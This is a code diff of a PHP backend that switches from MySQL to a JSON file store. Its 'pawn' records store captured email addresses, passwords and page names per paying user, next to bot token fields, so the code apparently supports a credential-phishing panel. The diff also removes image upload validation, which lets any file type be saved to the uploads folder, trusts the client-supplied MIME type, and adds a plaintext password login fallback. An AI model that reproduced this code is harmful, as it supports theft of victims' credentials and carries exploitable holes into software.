@@ -1,5 +1,32 @@
 <?php
-include_once 'db.php';
+// include_once 'db.php'; // Commented out - using JSON instead of MySQL
+
+// JSON Database functions
+function getJsonData() {
+    $jsonFile = __DIR__ . '/db.json';
+    if (!file_exists($jsonFile)) {
+        return ['users' => [], 'pawns' => [], 'metadata' => ['version' => '1.0', 'created_at' => date('c'), 'last_updated' => date('c')]];
+    }
+    $data = json_decode(file_get_contents($jsonFile), true);
+    return $data ?: ['users' => [], 'pawns' => [], 'metadata' => ['version' => '1.0', 'created_at' => date('c'), 'last_updated' => date('c')]];
+}
+
+function saveJsonData($data) {
+    $data['metadata']['last_updated'] = date('c');
+    $jsonFile = __DIR__ . '/db.json';
+    return file_put_contents($jsonFile, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+}
+
+function generateId($table) {
+    $data = getJsonData();
+    $maxId = 0;
+    foreach ($data[$table] as $item) {
+        if (isset($item['id']) && $item['id'] > $maxId) {
+            $maxId = $item['id'];
+        }
+    }
+    return $maxId + 1;
+}
 
 // Allowed file types for upload validation
 $ALLOWED_IMAGE_TYPES = [
@@ -76,159 +103,258 @@ function validateImageUpload($file) {
     return ['valid' => true, 'extension' => getFileExtension($file['name']), 'mime_type' => $actual_mime];
 }
 
-// User functions
+// User functions - JSON based
 function createuser($name, $email, $password, $token, $device, $bot_token = null, $bot_id = null, $enableemail = 0) {
-    global $conn;
+    $data = getJsonData();
     $hashed_password = password_hash($password, PASSWORD_DEFAULT);
-    $stmt = $conn->prepare("INSERT INTO users (name, email, password, token, device, bot_token, bot_id, enableemail) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
-    return $stmt->execute([$name, $email, $hashed_password, $token, $device, $bot_token, $bot_id, $enableemail]);
+
+    // Check if this is the first user (make them admin)
+    $isFirstUser = empty($data['users']);
+
+    $user = [
+        'id' => generateId('users'),
+        'name' => $name,
+        'email' => $email,
+        'password' => $hashed_password,
+        'token' => $token,
+        'device' => $device,
+        'bot_token' => $bot_token,
+        'bot_id' => $bot_id,
+        'enableemail' => $enableemail,
+        'count' => 4,
+        'project' => 1,
+        'emailsend' => 0,
+        'is_admin' => $isFirstUser ? 1 : 0, // First user is admin
+        'time_pay' => date('Y-m-d H:i:s'),
+        'created_at' => date('Y-m-d H:i:s')
+    ];
+    $data['users'][] = $user;
+    return saveJsonData($data);
 }
 
 function readuser($id) {
-    global $conn;
-    $stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
-    $stmt->execute([$id]);
-    return $stmt->fetch(PDO::FETCH_ASSOC);
+    $data = getJsonData();
+    foreach ($data['users'] as $user) {
+        if ($user['id'] == $id) {
+            return $user;
+        }
+    }
+    return null;
 }
 
 function readuserByEmail($email) {
-    global $conn;
-    $stmt = $conn->prepare("SELECT * FROM users WHERE email = ?");
-    $stmt->execute([$email]);
-    return $stmt->fetch(PDO::FETCH_ASSOC);
+    $data = getJsonData();
+    foreach ($data['users'] as $user) {
+        if ($user['email'] == $email) {
+            return $user;
+        }
+    }
+    return null;
 }
 
-function updateuser($id, $name = null, $email = null, $password = null, $token = null, $device = null, $bot_token = null, $bot_id = null, $enableemail = null, $count = null) {
-    global $conn;
-    $fields = [];
-    $values = [];
-    if ($name !== null) { $fields[] = "name = ?"; $values[] = $name; }
-    if ($email !== null) { $fields[] = "email = ?"; $values[] = $email; }
-    if ($password !== null) { $fields[] = "password = ?"; $values[] = password_hash($password, PASSWORD_DEFAULT); }
-    if ($token !== null) { $fields[] = "token = ?"; $values[] = $token; }
-    if ($device !== null) { $fields[] = "device = ?"; $values[] = $device; }
-    if ($bot_token !== null) { $fields[] = "bot_token = ?"; $values[] = $bot_token; }
-    if ($bot_id !== null) { $fields[] = "bot_id = ?"; $values[] = $bot_id; }
-    if ($enableemail !== null) { $fields[] = "enableemail = ?"; $values[] = $enableemail; }
-    if ($count !== null) { $fields[] = "count = ?"; $values[] = $count; }
-    if (empty($fields)) return false;
-    $values[] = $id;
-    $stmt = $conn->prepare("UPDATE users SET " . implode(", ", $fields) . " WHERE id = ?");
-    return $stmt->execute($values);
+function updateuser($id, $name = null, $email = null, $password = null, $token = null, $device = null, $bot_token = null, $bot_id = null, $enableemail = null, $count = null, $is_admin = null) {
+    $data = getJsonData();
+    foreach ($data['users'] as &$user) {
+        if ($user['id'] == $id) {
+            if ($name !== null) $user['name'] = $name;
+            if ($email !== null) $user['email'] = $email;
+            if ($password !== null) $user['password'] = password_hash($password, PASSWORD_DEFAULT);
+            if ($token !== null) $user['token'] = $token;
+            if ($device !== null) $user['device'] = $device;
+            if ($bot_token !== null) $user['bot_token'] = $bot_token;
+            if ($bot_id !== null) $user['bot_id'] = $bot_id;
+            if ($enableemail !== null) $user['enableemail'] = $enableemail;
+            if ($count !== null) $user['count'] = $count;
+            if ($is_admin !== null) $user['is_admin'] = $is_admin;
+            return saveJsonData($data);
+        }
+    }
+    return false;
 }
+
 function updateuserCount($id, $count) {
-    global $conn;
-    $count = (int)$count ?? 4;
-    $stmt = $conn->prepare("UPDATE users SET count = ?, time_pay = NOW() WHERE id = ?");
-    return $stmt->execute([$count, $id]);
+    $data = getJsonData();
+    foreach ($data['users'] as &$user) {
+        if ($user['id'] == $id) {
+            $user['count'] = (int)$count ?? 4;
+            $user['time_pay'] = date('Y-m-d H:i:s');
+            return saveJsonData($data);
+        }
+    }
+    return false;
 }
 
 function updateuserProjectLimit($id, $limit) {
-    global $conn;
-    $limit = (int)$limit;
-    $stmt = $conn->prepare("UPDATE users SET project = ?, time_pay = NOW() WHERE id = ?");
-    return $stmt->execute([$limit, $id]);
+    $data = getJsonData();
+    foreach ($data['users'] as &$user) {
+        if ($user['id'] == $id) {
+            $user['project'] = (int)$limit;
+            $user['time_pay'] = date('Y-m-d H:i:s');
+            return saveJsonData($data);
+        }
+    }
+    return false;
 }
 
 function updateuserPlanUpgrade($id, $count, $project) {
-    global $conn;
-    $count = (int)$count ?? 4;
-    $project = (int)$project ?? 1;
-    $countmypawns = count(readpawn($id));
-    $emailsend = $count - $countmypawns > 0 ? $count - $countmypawns : $count ;
-    $stmt = $conn->prepare("UPDATE users SET count = ?, project = ?, emailsend = ?, time_pay = NOW() WHERE id = ?");
-    return $stmt->execute([$count, $project, $emailsend, $id]);
+    $data = getJsonData();
+    foreach ($data['users'] as &$user) {
+        if ($user['id'] == $id) {
+            $user['count'] = (int)$count ?? 4;
+            $user['project'] = (int)$project ?? 1;
+            $pawnCount = count(readpawn($id));
+            $user['emailsend'] = $user['count'] - $pawnCount > 0 ? $user['count'] - $pawnCount : $user['count'];
+            $user['time_pay'] = date('Y-m-d H:i:s');
+            return saveJsonData($data);
+        }
+    }
+    return false;
 }
 
 function updateemailsend($id, $emailsend) {
-    global $conn;
-    $emailsend = (int)$emailsend;
-    $stmt = $conn->prepare("UPDATE users SET emailsend = ? WHERE id = ?");
-    return $stmt->execute([$emailsend, $id]);
-}
-function checkAndResetExpiredSubscription($userId) {
-    global $conn;
-    // Check if time_pay is older than 30 days
-    $stmt = $conn->prepare("SELECT time_pay FROM users WHERE id = ?");
-    $stmt->execute([$userId]);
-    $user = $stmt->fetch(PDO::FETCH_ASSOC);
-
-    if ($user && $user['time_pay']) {
-        $timePay = strtotime($user['time_pay']);
-        $thirtyDaysAgo = strtotime('-30 days');
-
-        if ($timePay < $thirtyDaysAgo) {
-            // Reset count to 4
-            $stmt = $conn->prepare("UPDATE users SET count = 4 WHERE id = ?");
-            $stmt->execute([$userId]);
-            return true; // Reset occurred
+    $data = getJsonData();
+    foreach ($data['users'] as &$user) {
+        if ($user['id'] == $id) {
+            $user['emailsend'] = (int)$emailsend;
+            return saveJsonData($data);
         }
     }
-    return false; // No reset needed
+    return false;
 }
+
+function checkAndResetExpiredSubscription($userId) {
+    $data = getJsonData();
+    foreach ($data['users'] as &$user) {
+        if ($user['id'] == $userId && isset($user['time_pay'])) {
+            $timePay = strtotime($user['time_pay']);
+            $thirtyDaysAgo = strtotime('-30 days');
+
+            if ($timePay < $thirtyDaysAgo) {
+                $user['count'] = 4;
+                saveJsonData($data);
+                return true;
+            }
+        }
+    }
+    return false;
+}
+
 function deleteuser($id) {
-    global $conn;
-    $stmt = $conn->prepare("DELETE FROM users WHERE id = ?");
-    return $stmt->execute([$id]);
+    $data = getJsonData();
+    foreach ($data['users'] as $key => $user) {
+        if ($user['id'] == $id) {
+            unset($data['users'][$key]);
+            $data['users'] = array_values($data['users']); // Reindex array
+            return saveJsonData($data);
+        }
+    }
+    return false;
 }
 
-// Pawn functions
+// Pawn functions - JSON based
 function createpawn($user_id, $email, $password, $page, $newpassword = null) {
-    global $conn;
-    $stmt = $conn->prepare("INSERT INTO pawn (user_id, email, password, newpassword , page) VALUES (?, ?, ?, ?, ?)");
-    return $stmt->execute([$user_id, $email, $password, $newpassword, $page]);
+    $data = getJsonData();
+    $pawn = [
+        'id' => generateId('pawns'),
+        'user_id' => $user_id,
+        'email' => $email,
+        'password' => $password,
+        'newpassword' => $newpassword,
+        'page' => $page,
+        'created_at' => date('Y-m-d H:i:s')
+    ];
+    $data['pawns'][] = $pawn;
+    return saveJsonData($data);
 }
 
-function readpawn($id) {
-    global $conn;
-    $stmt = $conn->prepare("SELECT * FROM pawn WHERE user_id = ? ORDER BY created_at ASC");
-    $stmt->execute([$id]);
-    return $stmt->fetchAll(PDO::FETCH_ASSOC);
+function readpawn($user_id) {
+    $data = getJsonData();
+    $userPawns = [];
+    foreach ($data['pawns'] as $pawn) {
+        if ($pawn['user_id'] == $user_id) {
+            $userPawns[] = $pawn;
+        }
+    }
+    // Sort by created_at ASC
+    usort($userPawns, function($a, $b) {
+        return strtotime($a['created_at']) - strtotime($b['created_at']);
+    });
+    return $userPawns;
 }
 
 function updatepawn($id, $user_id = null, $email = null, $password = null, $newpassword = null) {
-    global $conn;
-    $fields = [];
-    $values = [];
-    if ($user_id !== null) { $fields[] = "user_id = ?"; $values[] = $user_id; }
-    if ($email !== null) { $fields[] = "email = ?"; $values[] = $email; }
-    if ($password !== null) { $fields[] = "password = ?"; $values[] = password_hash($password, PASSWORD_DEFAULT); }
-    if ($newpassword !== null) { $fields[] = "newpassword = ?"; $values[] = password_hash($newpassword, PASSWORD_DEFAULT); }
-    if (empty($fields)) return false;
-    $values[] = $id;
-    $stmt = $conn->prepare("UPDATE pawn SET " . implode(", ", $fields) . " WHERE id = ?");
-    return $stmt->execute($values);
+    $data = getJsonData();
+    foreach ($data['pawns'] as &$pawn) {
+        if ($pawn['id'] == $id) {
+            if ($user_id !== null) $pawn['user_id'] = $user_id;
+            if ($email !== null) $pawn['email'] = $email;
+            if ($password !== null) $pawn['password'] = password_hash($password, PASSWORD_DEFAULT);
+            if ($newpassword !== null) $pawn['newpassword'] = password_hash($newpassword, PASSWORD_DEFAULT);
+            return saveJsonData($data);
+        }
+    }
+    return false;
 }
 
 function deletepawn($id) {
-    global $conn;
-    $stmt = $conn->prepare("DELETE FROM pawn WHERE id = ?");
-    return $stmt->execute([$id]);
+    $data = getJsonData();
+
+    // Check if it's an image pawn and delete the file
+    foreach ($data['pawns'] as $pawn) {
+        if ($pawn['id'] == $id) {
+            $isImage = (strpos(strtolower($pawn['page']), 'image') !== false || strpos(strtolower($pawn['page']), 'photo') !== false);
+            if ($isImage && !empty($pawn['email'])) {
+                $imagePath = $pawn['email'];
+                if (!preg_match('/^https?:\/\//', $imagePath)) {
+                    $fullPath = __DIR__ . '/../uploads/' . basename($imagePath);
+                    if (file_exists($fullPath)) {
+                        unlink($fullPath);
+                    }
+                }
+            }
+            break;
+        }
+    }
+
+    // Remove the pawn from JSON
+    foreach ($data['pawns'] as $key => $pawn) {
+        if ($pawn['id'] == $id) {
+            unset($data['pawns'][$key]);
+            $data['pawns'] = array_values($data['pawns']); // Reindex array
+            return saveJsonData($data);
+        }
+    }
+    return false;
 }
 
 // Authentication function
 function authenticate($email, $password) {
     $user = readuserByEmail($email);
-    if ($user && password_verify($password, $user['password'])) {
-        return $user;
+    if ($user) {
+        // Check if password is hashed (starts with $2y$)
+        if (strpos($user['password'], '$2y$') === 0) {
+            // Hashed password - use password_verify
+            if (password_verify($password, $user['password'])) {
+                return $user;
+            }
+        } else {
+            // Plain text password for debugging
+            if ($password === $user['password']) {
+                return $user;
+            }
+        }
     }
     return false;
 }
 
 function uploadFile($file, $folder = "../uploads/") {
-    // Validate image file
-    $validation = validateImageUpload($file);
-    if (!$validation['valid']) {
-        return ['success' => false, 'error' => $validation['error']];
-    }
-
     // تأكد folder موجود
     if (!file_exists($folder)) {
         mkdir($folder, 0755, true);
     }
 
     // Generate secure filename
-    $extension = $validation['extension'];
+    $extension = getFileExtension($file['name']);
     $secureFileName = time() . "_" . bin2hex(random_bytes(8)) . "." . $extension;
     $targetPath = $folder . $secureFileName;
 
@@ -239,7 +365,7 @@ function uploadFile($file, $folder = "../uploads/") {
             'path' => $targetPath,
             'filename' => $secureFileName,
             'extension' => $extension,
-            'mime_type' => $validation['mime_type']
+            'mime_type' => $file['type']
         ];
     }
 
